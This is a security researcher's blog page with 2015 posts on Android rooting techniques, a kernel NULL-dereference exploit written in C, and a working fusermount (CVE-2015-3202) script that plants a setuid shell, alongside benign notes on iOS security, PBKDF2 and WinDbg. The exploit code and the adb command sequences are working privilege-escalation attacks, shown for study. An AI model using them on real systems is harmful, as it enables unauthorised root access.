
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>KC's blog</title>
  <meta name="author" content="KC">

  
  <meta name="description" content="Windows 8.x TrackPopupMenu Privilege Escalation
">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://zomo.heroku.com/posts/6/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="KC's blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">KC's blog</a></h1>
  
    <h2>A blogging framework for hackers.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="zomo.heroku.com">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/25/windows-8-dot-x-trackpopupmenu-privilege-escalation/">Windows 8.X TrackPopupMenu Privilege Escalation</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-25T23:02:30+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:02 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://packetstormsecurity.com/files/131964/trackpopupmenu-escalate.txt">Windows 8.x TrackPopupMenu Privilege Escalation</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/25/rooting-methods/">Rooting Methods</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-25T22:20:02+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:20 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h3>HackingTeam 이 사용하는 exploits</h3>

<ul>
<li>framaroot</li>
<li><a href="https://github.com/android-rooting-tools">towelroot</a></li>
<li><a href="https://github.com/fi01/libput_user_exploit/blob/master/put_user.c">putuser</a></li>
</ul>


<h3>Gingerbreak</h3>

<p>The vulnerability exploited by Gingerbreak exists in the Volume Manager (vold) on Android version 2.2 (Froyo) - and 3.0 (Honeycomb). Vold manages the mounting of external storage volumes on Android. The vulnerability was an out-of-bounds array access that allowed the exploit author to overwrite entries in the Global Offset Table (GOT) to trick the system into executing a copy of the sh binary as root.</p>

<p><a href="http://c-skills.blogspot.com/2011/04/yummy-yummy-gingerbreak.html">here</a></p>

<h3>Exynos Abuse - Exploiting Custom Drivers</h3>

<p><a href="http://forum.xda-developers.com/showthread.php?t=2048511">here</a></p>

<p>The post detailed that a block device located at /dev/exynos-mem allowed the mapping of kernel memory into user space by any user. The exploitation technique used was to patch a comparison made in the <code>setresuid()</code> function. This comparison is normally <code>cmp r0,#0</code> and was altered to <code>cmp r0,#1</code> as a result of having complete access to the memory space, which meant that when sysresuid(0) was called later on the code, access was granted to change to root context. This exploit also elegantly bypassed the <code>kptr_restrict</code> memory protection, which does not allow applications to read <code>/proc/kallsyms</code> and obtain kernel pointers. It did so by changing the enforcing flag of this check in live memory.</p>

<h3>Samsung Admire - Abusing File Permissions with Symlinks</h3>

<p>Permissive file permissions on files used by the system on Android devices can sometimes be used to obtain root. This method may sound obscure but consider the following classic example from Dan Rosenberg in his exploit for the Samsung Admire: <a href="http://vulnfactory.org/blog/2011/09/12/rooting-the-samsung-admire/">here</a></p>

<p>He discovered that when an application crashes, a dump file was created at <code>/data/log/dumpState_app_native.log</code> on the filesystem by root with the world-writable file permission. In addition, the <code>/data/log</code> parent directory was also world-writable. Therefore, placing a symbolic link named <code>dumpState_app_native.log</code> in this directory and causing an application to crash would cause a file to be written somewhere else on the filesystem as world-writable. There existed a file in older versions of Android at <code>/data/local.prop</code>, which was used to (among other things) determine what privilege level ADB should run under. This file was not present on this device and so Dan exploited this vulnerability to create the <code>/data/local/prop</code> file as wrold-writable and then insert a command in this file stating that ADB should run as root. This attribute is <code>ro.kernel.qemu=1</code> on this particular device. From there the exploit uses ADB as root, place the su binary, and installs the root manager application.</p>

<h3>Acer Iconia - Exploiting SUID binaries</h3>

<p>A SUID binary that is owned by root and world-executable is very high-value target for root exploit developers. If they discover any vulnerabilities in this binary that allow the execution of arbitary code, they will have gained root access on the device.
This particular issue was discovered by an XDA Developers user named sc2k on the Acer Iconia A1000, which had a pre-installed SUID binary named cmdclient that was vulnerable to command injection. See the original post at <a href="http://forum.xda-developers.com/showthread.php?t=1138228">here</a>.</p>

<h3>Master Key Bugs - Exploiting Android AOSP System Code</h3>

<p><a href="http://www.saurik.com/id/17">here</a>
<a href="http://www.cydiaimpactor.com">Cydia Impactor</a></p>

<h3>TowelRoot</h3>

<p><a href="http://www.all-things-android.com/content/android-and-linux-kernel-towelroot-exploit">here</a></p>

<h3>Wunderbar/asroot</h3>

<p>This bug was discovered by Tavis Ormandy and Julien Tinnes of the Google Security Team and was assigned CVE-2009-2692.</p>

<p>The Linux kernel 2.6.0 through 2.6.30.4 and 2.4.4 through 2.4.37.4, does not initialize all function pointers for socket operations in proto_ops structures, which allows local users to trigger a NULL pointer dereference and gain privileges by using mmap to map page zero, placing arbitrary code on this page, and then invoking an unavailable operation, as demonstrated by the sendpage operation (sock_sendpage function) on a PF_PPPOX socket.</p>

<p><a href="http://www.zenthought.org/content/file/android-root-2009-08-16-source">here</a></p>

<h3>Recovery: Volez</h3>

<p>A typographical error in the signature verifier used in Android 2.0 and 2.0.1 recovery images caused the recovery to incorrectly detect the End of Central Directory (EOCD) record inside a signed update.zip file. This issue resulted in the ability to modify the contents of a signed OTA recovery image.</p>

<p><a href="http://zenthought.org/content/project/volez">here</a></p>

<h3>Udev: Exploid</h3>

<ul>
<li>CVE-2009-1185</li>
</ul>


<h3>Adbd: RageAgainstTheCage</h3>

<p><a href="http://stealth.openwall.net/xSports/RageAgainstTheCage.tgz">here</a></p>

<h3>Zygote: Zimperlich and Zyysploit</h3>

<p><a href="http://c-skills.blogspot.com.es/2011/02/zimperlich-sources.html">here</a>
<a href="https://github.com/unrevoked/zysploit">here</a></p>

<h3>Ashmem: KillingTheNameOf and psneuter</h3>

<p><a href="http://c-skills.blogspot.com/2011/01/adb-trickery-again.html">here</a>
<a href="https://github.com/tmzt/g2root-kmod/tree/scotty2/scotty2/psneuter">here</a></p>

<h3>PowerVR: Ievitator</h3>

<p><a href="http://jon.oberheide.org/files/levitator.c">here</a></p>

<h3>Libsysutils: zergRush</h3>

<p><a href="https://github.com/revolutionary/zergRush">here</a></p>

<h3>Kernel: mempodroid</h3>

<p>[here](<a href="https://github.com/saurik/mempoj">https://github.com/saurik/mempoj</a></p>

<h3>File Permission and Symbolic Link-Related Attacks</h3>

<p><a href="http://vulnfactory.org/blog/">here</a></p>

<p>Initial versions of Android 4.0 had a bug in the init functions for do_chmod, mkdir, and do_chown
that applied the ownership and file permissions specified even if the last element of their target
path was a symbolic link. Some Android devices have the following line in their init.rc script.</p>

<p><code>mkdir /data/local/tmp 0771 shell shell</code></p>

<p>As you can guess now, if the /data/local folder is writeable by the user or group shell, you can
exploit this flaw to make the /data folder writeable by replacing /data/local/tmp with a symbolic
link to /data and rebooting the device. After rebooting, you can create or modify the /data/local.prop
file to set the property <code>ro.kernel.qemu</code> to 1.</p>

<p>The commands to exploit this flaw are as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>adb shell rm -r /data/local/tmp
</span><span class='line'>adb shell ln -s /data/ /data/local/tmp
</span><span class='line'>adb reboot
</span><span class='line'>adb shell "echo 'ro.kernel.qemu=1' &gt; /data/local.prop"
</span><span class='line'>adb reboot</span></code></pre></td></tr></table></div></figure>


<p>Another popular variant of this vulnerability links /data/local/tmp to the system partition and then
uses debugfs to write the su binary and make it set-uid root. For example, the ASUS Transformer Prime
running Android 4.0.3 is vulnerable to this variant.</p>

<p>The init scripts in Android 4.2 apply <code>O_NOFOLLOW</code> semantics to prevent this calss of symbolic link attacks.</p>

<h3>Adb Restore Race Condition</h3>

<p>Android 4.0 introduced the ability to do full device backups through the adb backup command.
This command backs up all data and applications into the file backup.ab, which is a compressed
TAR file with a prepended header. The <code>adb restore</code> command is used to restore the data.</p>

<p>There were two security issues in the initial implementation of the restore process that were
fixed in Android 4.1.1. The first issue allowed creating files and directories accessible by other
applications. The second issue allowed restoring file sets from packages that run under a special UID,
such as system, without a special backup agent to handle the restore process.</p>

<p>To exploit these issues, Andreas Makris (Bin4ry) created a specially crafted backup file with a world
readble/writeable/executable directory containing 100 files with the content <code>ro.kernel.qemu=1</code> and
<code>ro.secure=0</code> inside it. When the contents of this file are written to <code>/data/local.prop</code>, it makes
<code>adbd</code> run with root privieges on boot.</p>

<p><a href="http://forum.xda-developers.com/showthread.php?t=1886460">here</a></p>

<p>The following one-liner, if executed while the <code>adb restore</code> command is running, causes a race between
the restore process in the backup manager service and the while loop run by the <code>shell</code> user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>adb shell "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99; do :; done"</span></code></pre></td></tr></table></div></figure>


<p>If the loop creates the symbolic link in file99 before the restore process restores it, the restore
process follows the symbolic link and writes the read-only system properties to /data/local.prop, making
adbd run as root in the next reboot.</p>

<h3>Exynos4: exynos-abuse</h3>

<ul>
<li><a href="http://forum.xda-developers.com/showthread.php?t=2048511">here</a></li>
<li><a href="http://blog.azimuthsecurity.com/2013/02/revisiting-exynos-memory-mapping-bug.html">Framaroot</a></li>
</ul>


<h3>Diag: lit / diaggetroot</h3>

<p>This vulnerability was discovered by giantpune and was assigned CVE identifier CVE-2012-4220:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>diagchar_core.c in the Qualcomm Innovation Center (QuIC) Diagnostics (aka DIAG) kernel-mode driver
</span><span class='line'>for Android 2.3 through 4.2 allows attackers to execute arbitrary code or cause a 
</span><span class='line'>denial of service (incorrect pointer dereference) via an application that uses crafted arguments in a
</span><span class='line'>local diagchar_ioctl call.</span></code></pre></td></tr></table></div></figure>


<p><a href="https://docs.google.com/file/d/oB8LDObFOpzZqQzducmxjRExXNnM/edit?pli=1">here</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/25/much-ado-about-null-exploiting/">Much Ado About Null Exploiting</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-25T00:06:55+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:06 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="https://blogs.oracle.com/ksplice/entry/much_ado_about_null_exploiting1">Much Ado About Null Exploiting</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;sys/mman.h&gt;
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;fcntl.h&gt;
</span><span class='line'>
</span><span class='line'>struct cred;
</span><span class='line'>struct task_struct;
</span><span class='line'>
</span><span class='line'>typedef struct cred *(*prepare_kernel_cret_t)(struct task_struct *daemon) __attribute__((regparm(3)));
</span><span class='line'>typedef int (*commit_creds_t)(struct cred *new) __attribute__((regparm(3)));
</span><span class='line'>
</span><span class='line'>prepare_kernel_cret_t prepare_kernel_cred;
</span><span class='line'>commit_creds_t commit_creds;
</span><span class='line'>
</span><span class='line'>void *get_ksym(char *name) {
</span><span class='line'>    FILE *f = fopen("/proc/kallsyms", "rb");
</span><span class='line'>    char c,sym[512];
</span><span class='line'>    void *addr;
</span><span class='line'>    int ret;
</span><span class='line'>    while (fscanf(f,"%p %c %s\n", &addr, &c, sym) &gt; 0)
</span><span class='line'>        if (!strcmp(sym,name)) return addr;
</span><span class='line'>    return NULL;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>void get_root(void) { commit_creds(prepare_kernel_cred(0)); }
</span><span class='line'>
</span><span class='line'>int main() {
</span><span class='line'>    prepare_kernel_cred = get_ksym("prepare_kernel_cred");
</span><span class='line'>    commit_creds = get_ksym("commit_creds");
</span><span class='line'>
</span><span class='line'>    if (!prepare_kernel_cred || !commit_creds) {
</span><span class='line'>        fprintf(stderr, "Kernel symbols not found.");
</span><span class='line'>        exit(1);
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    mmap(0,4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
</span><span class='line'>    void (**fn)(void) = NULL;
</span><span class='line'>    *fn = get_root;
</span><span class='line'>
</span><span class='line'>    int fd = open("/sys/kernel/debug/nullderef/null_call", O_WRONLY);
</span><span class='line'>    write(fd, "1", 1);
</span><span class='line'>    close(fd);
</span><span class='line'>
</span><span class='line'>    if (getuid() == 0) {
</span><span class='line'>        char *argv[] = { "/bin/sh", NULL }
</span><span class='line'>        execve("/bin/sh", argv, NULL);
</span><span class='line'>    }
</span><span class='line'>    fprintf(stderr, "Something went wrong.");
</span><span class='line'>    return 1;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/24/ios-security-guide-ios-8-dot-3-or-later/">iOS Security Guide - iOS 8.3 or Later</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-24T14:07:16+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:07 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="https://www.apple.com/business/docs/iOS_Security_Guide.pdf">iOS Security Guide - iOS 8.3 or later</a></p>

<p>Apple Watch 가 나오면서 저 문서가 update 되었다.</p>

<ul>
<li><a href="http://fromsiliconvalley.com/tag/secure-enclave/">Apple Shoots, Scores in Security. Quietly.</a></li>
</ul>


<h3>Secure Enclave</h3>

<ul>
<li><p>우선 ROM 에 Apple Certificate 이 박혀있어서, 애플이 서명한 컨텐츠를 검증할 수 있는데, ROM 에 박혀있기 때문에,
손대는 것이 불가능.</p></li>
<li><p>아이폰에는 Secure Enclave 라는 암호 코프로세서가 존재하는데, 이 안에 디바이스마다 유니크한 256-bit UID 가
제작 과정에서 각인됨. 애플에 따르면 자기들도 기록해두지 않아서 모르고, 생산된 디바이스에서 UID 를 recover
하는 것은 불가능. 아무도 모르는 유니크한 256-bit 가 코프로세서 안에 존재하는 셈.</p></li>
<li><p>Secure Enclave 는 암호화 엔진을 가지고 있는데, 암호키를 만들때 유저가 입력한 패스워드에 UID 를 섞기
때문에 고성능 FPGA 를 이용한 딕셔너리 공격이 어렵게 된다. Enc(사전에 나오는 단어+UID, Key) 를 돌려야하는데,
UID 는 코프로세서 밖으로 추출이 불가능하기때문에, 해당 아이폰에서만 복호화가 가능한 구조. 패스워드와 UID 를 섞는 과정은 80ms 가 걸리도록 튜닝되어있음.</p></li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/24/implementing-a-pbkdf2-based-password-storage-scheme-for-firefox-os/">Implementing a PBKDF2-Based Password Storage Scheme for FireFox OS</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-24T13:39:40+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:39 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="https://timtaubert.de/blog/2015/05/implementing-a-pbkdf2-based-password-storage-scheme-for-firefox-os/">Implementing A PBKDF2-Based Password Storage Scheme for FireFox OS</a></p>

<h4>The Passcode Module</h4>

<h4>Make The Passcode Look &ldquo;Random&rdquo;</h4>

<h4>Choosing PBKDF2 Parameters</h4>

<h4>Do Not Hard-code Parameters</h4>

<h4>Storing a New Passcode</h4>

<h4>Verifying a Given Passcode</h4>

<h4>What About bcrypt or scrypt?</h4>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/24/peb/">PEB</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-24T12:43:54+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:43 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><ul>
<li>youmin3.egloos.com/1650047</li>
<li>anster.egloos.com/2128538</li>
</ul>


<h4>PEB &amp; TEB</h4>

<ul>
<li>EPROCESS (in kernel)</li>
<li><p>ETHREAD (in kernel)</p></li>
<li><p>KPROCESS(Process Control Block) in EPROCESS (in kernel)</p></li>
<li><p>KTHREAD(Thread Control Block) in ETHREAD (in kernel)</p></li>
<li><p>PEB (in user space)</p></li>
<li>TEB (in user space)</li>
</ul>


<h4>WinDbg</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt _PEB
</span><span class='line'>
</span><span class='line'>kd&gt; dt _EPROCESS
</span><span class='line'>
</span><span class='line'>kd&gt; dt _KPROCESS
</span><span class='line'>
</span><span class='line'>kd&gt; dt -a -b _TEB
</span><span class='line'>
</span><span class='line'>kd&gt; dt _ETHREAD
</span><span class='line'>
</span><span class='line'>kd&gt; dt _KTHREAD
</span></code></pre></td></tr></table></div></figure>


<h4>GetCurrentProcessID</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; uf kernel32!GetCurrentProcessID
</span><span class='line'>
</span><span class='line'>kd&gt; uf kernel32!GetCurrentThreadID</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/22/cve-2015-3202-fusermount/">CVE-2015-3202: Fusermount</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-22T23:07:55+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>11:07 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Tavis Ormandy 가 데비안/우분투에서 root 를 얻는 버그를 공개했다.</p>

<p><a href="https://gist.github.com/taviso/ecb70eb12d461dd85cba">gist</a></p>

<p>Twitter 에 올릴라고 140 자로 압축한 exploit 을 풀어봤다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ cat babo.sh
</span><span class='line'>echo "chmod 4755 /bin/sh" &gt; /tmp/babo
</span><span class='line'>chmod 755 /tmp/babo
</span><span class='line'>mkdir -p /tmp/babo\;/tmp/babo
</span><span class='line'>LIBMOUNT_MTAB=/etc/bash.bashrc _FUSE_COMMFD=0 fusermount /tmp/babo\;/tmp/babo</span></code></pre></td></tr></table></div></figure>


<p>이 간단한 스크립트를 실행해본다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ ./babo.sh
</span><span class='line'>fusermount: failed to open /etc/fuse.conf: Permission denied
</span><span class='line'>sending file descriptor: Socket operation on non-socket
</span><span class='line'>z@ubuntu:~$ cat /etc/bash.bashrc
</span><span class='line'>/dev/fuse /tmp/.6960;/tmp/.6960 fuse rw,nosuid,nodev,user=z 0 0</span></code></pre></td></tr></table></div></figure>


<p>이제 관리자가 sudo 나 root login 하기를 기다린다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ sudo -s
</span><span class='line'>bash: /dev/fuse: Permission denied
</span><span class='line'>root@ubuntu:~# exit
</span><span class='line'>exit
</span><span class='line'>z@ubuntu:~$ ls -lL /bin/sh
</span><span class='line'>-rwsr-xr-x 1 root root 121272 Feb 10    2014 /bin/sh
</span><span class='line'>z@ubuntu:~$</span></code></pre></td></tr></table></div></figure>


<p>저 스크립트를 돌리면</p>

<ol>
<li>fusermount 가 바보같이 /etc/bash.bashrc 에다가 마운트 테이블을 overwrite 하는데,</li>
<li>나중에 root 가 로그인할때 /etc/bash.bashrc 가 수행되면서, (sudo -s)</li>
<li>/tmp/.6960 이 수행되고</li>
<li>chmod 4755 /bin/sh 이 수행되면서</li>
<li>setuid 쉘이 만들어지는 결과</li>
</ol>


<p>가 나오는 것으로 보인다.</p>

<p>핵심은 1 번 버그인 것 같은데,</p>

<ol>
<li>fusermount 가 setuid 되어있다.</li>
<li>fusermount 가 /bin/mount 를 부를때 (setuid(geteuid()) 를 해서 ruid 를 0 를 만든다)</li>
<li>mount 는 root 가 불렀다고 착각한다. (fusermount 입장에서는 의도된 것이긴 하지만, mount 입장에서는 속은 것)</li>
<li>이제 mount 디버깅용 환경 변수가 먹힌다. (LIBMOUNT_MTAB)</li>
<li>이제 마운트 테이블로 어떤 화일이든 overwrite 할 수 있다.</li>
</ol>


<p>sudo 쳐주기를 기다려야한다는 점에서, 실전에서 유용성은 많이 떨어진다고 본다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/21/some-android-books/">Some Android Books</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-21T00:43:52+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>12:43 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>Bootstrapping</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export PATH=$PATH:/path/to/sdk/tools/:/path/to/sdk/platform-tools/
</span><span class='line'>
</span><span class='line'># cd /usr/local/bin
</span><span class='line'># ln -s /path/to/binary
</span><span class='line'>
</span><span class='line'>$ sudo apt-get install openjdk-6-jdk
</span><span class='line'>
</span><span class='line'>A 64-bit system requires an additional installation of 32-bit packages needed by the SDK tools.
</span><span class='line'>You can install these on Ubuntu 13.04 upward by using
</span><span class='line'>
</span><span class='line'>$ sudo dpkg -add-architecture i386
</span><span class='line'>$ sudo apt-get update
</span><span class='line'>$ sudo apt-get install libncurses5:i386 libstdc++6:i386 zlib1g:i386
</span><span class='line'>
</span><span class='line'>Prior to that version of Ubuntu, you use the following command:
</span><span class='line'>
</span><span class='line'>$ sudo apt-get 
</span><span class='line'>
</span><span class='line'>$ android sdk
</span><span class='line'>
</span><span class='line'>$ android avd
</span><span class='line'>
</span><span class='line'>$ emulator -avd kitkat
</span><span class='line'>
</span><span class='line'>$ adb devices
</span><span class='line'>
</span><span class='line'>$ adb -s device_id shell
</span><span class='line'>
</span><span class='line'>$ nc localhost 5554
</span><span class='line'>Android Console: type 'help' for a list of commands
</span><span class='line'>OK
</span><span class='line'>help
</span><span class='line'>
</span><span class='line'>* Genymotion (http://www.genymotion.com/)
</span><span class='line'>* Virtualbox running Android x86 (http://www.android-x86.org)
</span><span class='line'>* Youwave (https://youwave.com)
</span><span class='line'>* WindowsAndroid (http://windowsandroid.en.softonic.com/)
</span><span class='line'>
</span><span class='line'>shell@android:/ $ ps
</span><span class='line'>USER        PID     PPID        VSIZE       RSS     WCHAN       PC          NAME
</span><span class='line'>
</span><span class='line'>shell@android:/ # ls -l /data/data
</span><span class='line'>...
